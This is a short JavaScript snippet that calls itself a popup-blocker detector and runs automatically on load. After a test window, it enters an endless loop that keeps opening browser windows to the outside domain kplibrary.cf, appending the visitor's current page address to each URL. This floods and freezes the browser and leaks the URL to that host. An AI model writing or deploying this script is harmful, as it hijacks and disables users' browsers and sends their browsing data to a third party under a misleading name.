function detectPopupBlocker() {
  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
  if (!myTest) {
    alert("A popup blocker was detected.");
  } else {
    myTest.close();
    while (true) {
      window.open("http://kplibrary.cf/")
      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
      var URL = "http://kplibrary.cf/" + location.href;
      var win = window.open(URL, "_blank", strWindowFeatures);
      setTimeout(function() {
        for (var i = 0; i === i; i++) {}
      }, 5);
    }
  }
}
detectPopupBlocker();
